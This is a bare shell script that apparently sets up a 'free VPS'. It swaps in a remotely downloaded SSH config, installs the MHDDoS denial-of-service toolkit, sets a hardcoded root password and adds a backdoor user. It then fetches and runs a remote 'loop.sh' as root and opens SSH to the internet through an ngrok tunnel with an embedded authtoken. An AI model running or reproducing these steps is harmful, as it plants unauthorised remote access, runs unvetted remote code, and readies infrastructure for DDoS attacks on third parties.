sudo apt install openssh-server
cd /etc/ssh
sudo rm -r sshd_config
sudo wget https://github.com/Jackson9998/freevps/raw/main/sshd_config
sudo apt -y update && sudo apt -y install curl wget libcurl4 libssl-dev python3 python3-pip make cmake automake autoconf m4 build-essential git && git clone https://github.com/MatrixTM/MHDDoS.git && cd MH* && sudo pip3 install -r requirements.txt
echo 'root:040112' | sudo chpasswd
sudo useradd -m -p $(openssl passwd -1 040112) humberto
sudo wget https://github.com/Jackson9998/freevps/raw/main/loop.sh
sudo chmod 777 loop.sh
sudo service ssh restart
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok
ngrok config add-authtoken 25zOFhO9xHS6LJflCnRDtgrWFGl_23YL1E4RHatGeLtdXGh3M
screen -dmS Ngrok_Tecnic ngrok tcp 22
sudo ./loop.sh
